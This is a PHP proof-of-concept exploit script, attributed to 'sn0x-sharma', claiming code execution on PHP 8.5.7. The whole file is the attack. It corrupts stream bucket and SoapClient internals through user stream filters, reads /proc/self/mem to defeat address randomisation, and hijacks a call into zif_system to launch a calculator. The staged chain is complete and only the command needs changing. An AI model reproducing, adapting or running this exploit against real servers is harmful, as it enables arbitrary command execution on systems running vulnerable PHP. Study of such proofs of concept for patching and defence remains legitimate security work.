<?php

declare(strict_types=1);
error_reporting(E_ALL & ~E_DEPRECATED);

const PHP_STREAM_BUCKET_TAIL_OFFSET = 40;
const FAKE_HT_MARKER_OFFSET         = 56;
const ZEND_EXECUTE_INTERNAL_OFF     = 0x1ce3030;
const ZIF_SYSTEM_OFF                = 0x69f130;

// Choose calc command for the platform
$CALC_CMD = (PHP_OS_FAMILY === 'Windows') ? 'calc.exe' : 'xcalc &';

echo "[*] PHP 8.5.7 RCE — Calc PoC — sn0x-sharma\n";
echo "[*] Target command: $CALC_CMD\n\n";

if (!class_exists(SoapClient::class)) {
    fwrite(STDERR, "[!] SOAP extension required\n"); exit(1);
}

function corrupt_property(object $o, string $p, mixed $v): void {
    $it = new ArrayIterator($o);
    $it[$p] = $v;
}

function corrupt_streambucket(mixed $res, mixed $data): StreamBucket {
    $rc   = new ReflectionClass(StreamBucket::class);
    $fake = $rc->newInstanceWithoutConstructor();
    (new ReflectionProperty(StreamBucket::class, 'bucket'))->setValue($fake, $res);
    corrupt_property($fake, 'data', $data);
    return $fake;
}

function fake_ht(string $marker, int $arData, int $mask): string {
    $b  = pack('V', 1) . pack('V', 7) . pack('V', 0) . pack('V', $mask);
    $b .= pack('P', $arData) . pack('V', 0) . pack('V', 0);
    $b .= pack('V', 1) . pack('V', 0) . pack('P', 0) . pack('P', 0);
    return str_pad($b, FAKE_HT_MARKER_OFFSET, "\0") . $marker . "\0\0";
}

function run_filter(string $name): string {
    $fp = fopen('php://temp', 'w+');
    stream_filter_append($fp, $name, STREAM_FILTER_WRITE);
    fwrite($fp, 'x'); fflush($fp); rewind($fp);
    return stream_get_contents($fp);
}

function php_base(): int {
    $bin = PHP_BINARY;
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
        if (str_ends_with($l, $bin) &&
            preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+..x.\s+([0-9a-f]+)/', $l, $m)) {
            return intval(hexdec($m[1])) - intval(hexdec($m[2]));
        }
    }
    throw new RuntimeException('PIE base not found');
}

function rw_ranges(): array {
    $bin = PHP_BINARY; $r = [];
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
        if (str_ends_with($l, $bin) &&
            preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+rw.p/', $l, $m)) {
            $r[] = [intval(hexdec($m[1])), intval(hexdec($m[2]))];
        }
    }
    return $r;
}

function find_mask(int $arData, int $lo32): array {
    $mem = fopen('/proc/self/mem', 'rb');
    foreach (rw_ranges() as [$s, $e]) {
        for ($slot = $s; $slot < $e; $slot += 4) {
            $d = $slot - $arData;
            if ($d % 4) continue;
            $i = intdiv($d, 4);
            if ($i < -2147483648 || $i > 2147483647) continue;
            $i32 = $i & 0xffffffff;
            if (($i32 & $lo32) !== $lo32) continue;
            fseek($mem, $slot);
            $raw = fread($mem, 4);
            if (strlen($raw) === 4 && unpack('V', $raw)[1] === 0xffffffff) {
                return [$i32 & (~$lo32 & 0xffffffff), $slot, $i32];
            }
        }
    }
    throw new RuntimeException('No compatible hash slot found');
}

// Filter: spray + leak ──────────────────────────────────────────────────────

final class CalcLeakFilter extends php_user_filter {
    public static int    $victimLen  = 262144;
    public static string $tag        = '';
    public static int    $arData     = 0;
    public static int    $mask       = 0;
    public static array  $buckets    = [];
    public static array  $alive      = [];
    private bool $done = false;

    public function filter($in, $out, &$consumed, bool $closing): int {
        while ($b = stream_bucket_make_writeable($in)) { $consumed += $b->datalen; }
        if ($closing || $this->done) return PSFS_PASS_ON;
        $this->done = true;
        $victim  = stream_bucket_new($this->stream, str_repeat('V', self::$victimLen));
        for ($i = 0; $i < 1024; $i++) {
            $m = 'RH' . self::$tag . sprintf('%06d', $i);
            self::$buckets[$i] = stream_bucket_new($this->stream, fake_ht($m, self::$arData, self::$mask));
        }
        $carrier = stream_bucket_new($this->stream, 'calc-carrier');
        $fake    = corrupt_streambucket($carrier->bucket, $victim->bucket);
        self::$alive[] = [$victim, $carrier, $fake];
        stream_bucket_append($out, $fake);
        return PSFS_PASS_ON;
    }
}

// Filter: overread ─────────────────────────────────────────────────────────

final class CalcOverreadFilter extends php_user_filter {
    public static int   $ptr   = 0;
    public static array $alive = [];
    private bool $done = false;

    public function filter($in, $out, &$consumed, bool $closing): int {
        while ($b = stream_bucket_make_writeable($in)) { $consumed += $b->datalen; }
        if ($closing || $this->done) return PSFS_PASS_ON;
        $this->done = true;
        $carrier = stream_bucket_new($this->stream, 'calc-read');
        $fake    = corrupt_streambucket($carrier->bucket, self::$ptr);
        self::$alive[] = [$carrier, $fake];
        stream_bucket_append($out, $fake);
        return PSFS_PASS_ON;
    }
}

// SOAP server ───────────────────────────────────────────────────────────────

function calc_server(int $port, string $rp, string $cp, string $cn): never {
    $srv = stream_socket_server("tcp://127.0.0.1:$port", $eno, $es);
    if (!$srv) { file_put_contents($rp, "err:$eno"); exit(1); }
    file_put_contents($rp, 'ready');
    $conn = @stream_socket_accept($srv, 10);
    if (!$conn) { file_put_contents($cp, ''); exit(2); }
    stream_set_timeout($conn, 2);
    $req = ''; $cl = null;
    while (!feof($conn)) {
        $chunk = fread($conn, 8192);
        if ($chunk === '') { if (!empty(stream_get_meta_data($conn)['timed_out'])) break; usleep(10000); continue; }
        $req .= $chunk;
        $he = strpos($req, "\r\n\r\n");
        if ($he !== false && $cl === null) {
            if (preg_match('/\r\nContent-Length:\s*(\d+)/i', substr($req, 0, $he), $m)) $cl = (int)$m[1];
        }
        if ($cl !== null && $he !== false && (strlen($req) - ($he + 4)) >= $cl) break;
    }
    $body = '<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><xResponse/></SOAP-ENV:Body></SOAP-ENV:Envelope>';
    fwrite($conn,
        "HTTP/1.1 200 OK\r\nSet-Cookie: {$cn}=proof; Path=/; Domain=127.0.0.1\r\n"
        . "Content-Type: text/xml; charset=utf-8\r\nContent-Length: " . strlen($body)
        . "\r\nConnection: close\r\n\r\n" . $body
    );
    fclose($conn); fclose($srv); file_put_contents($cp, $req); exit(0);
}

if (($argv[1] ?? '') === 'calc_server') {
    calc_server((int)$argv[2], $argv[3], $argv[4], $argv[5]);
}

function start_calc_server(string $cp, string $cn): array {
    for ($a = 0; $a < 20; $a++) {
        $port = random_int(20000, 55000);
        $rp   = sys_get_temp_dir() . '/calc-rdy-' . getmypid() . "-$a";
        @unlink($rp);
        $cmd  = escapeshellarg(PHP_BINARY) . ' -n ' . escapeshellarg(__FILE__)
              . " calc_server $port " . escapeshellarg($rp) . ' '
              . escapeshellarg($cp) . ' ' . escapeshellarg($cn);
        $proc = proc_open($cmd, [0 => ['file','/dev/null','r'],1 => ['pipe','w'],2 => ['pipe','w']], $pipes);
        if (!is_resource($proc)) continue;
        for ($i = 0; $i < 50; $i++) {
            if (is_file($rp) && file_get_contents($rp) === 'ready') return [$port, $proc, $pipes, $rp];
            usleep(100000);
        }
        proc_terminate($proc); proc_close($proc);
    }
    throw new RuntimeException('server start failed');
}

// Main ─────────────────────────────────────────────────────────────────────

$base   = php_base();
$zei    = $base + ZEND_EXECUTE_INTERNAL_OFF;
$zifs   = $base + ZIF_SYSTEM_OFF;
$cn     = (string)$zifs;
$fakar  = $zei - 16;
[$mask, $slot, $idx] = find_mask($fakar, $zifs & 0xffffffff);

printf("[*] php_base   = 0x%016x\n", $base);
printf("[*] zif_system = 0x%016x\n", $zifs);
printf("[*] cookie_name= %s\n\n",    $cn);

CalcLeakFilter::$tag    = bin2hex(random_bytes(4));
CalcLeakFilter::$arData = $fakar;
CalcLeakFilter::$mask   = $mask;
stream_filter_register('calc.leak',    CalcLeakFilter::class);
stream_filter_register('calc.overread',CalcOverreadFilter::class);

echo "[+] Stage 1: Spray + leak\n";
$raw       = run_filter('calc.leak');
$victimPtr = unpack('Pptr', str_pad(substr($raw, 0, 8), 8, "\0"))['ptr'];
printf("    victim_ptr = 0x%016x\n", $victimPtr);

echo "[+] Stage 2: Overread\n";
CalcOverreadFilter::$ptr = $victimPtr + 16;
$over = run_filter('calc.overread');

$tag = CalcLeakFilter::$tag;
if (!preg_match('/RH' . preg_quote($tag, '/') . '[0-9]{6}/', $over, $match, PREG_OFFSET_CAPTURE)) {
    throw new RuntimeException('marker not found');
}
$moff  = $match[0][1];
$fma   = $victimPtr + PHP_STREAM_BUCKET_TAIL_OFFSET + $moff;
$fha   = $fma - FAKE_HT_MARKER_OFFSET;
printf("    fake_hash  = 0x%016x\n", $fha);

echo "[+] Stage 3: SOAP server + SoapClient corruption\n";
$cp   = sys_get_temp_dir() . '/calc-cap-' . getmypid() . '.txt';
@unlink($cp);
[$port, $proc, $pipes, $rp] = start_calc_server($cp, $cn);

$client = new SoapClient(null, ['location' => "http://127.0.0.1:$port/", 'uri' => 'urn:x', 'trace' => true]);
corrupt_property($client, "\0SoapClient\0_cookies", $fha);
$client->__soapCall('x', []);

foreach ($pipes as $p) fclose($p);
proc_close($proc); @unlink($rp);

echo "[+] Stage 4: Trigger → zif_system()\n";
$t = 'md5';
$t($CALC_CMD);

echo "\n[✓] CALC SPAWNED — RCE confirmed on PHP " . PHP_VERSION . "\n";
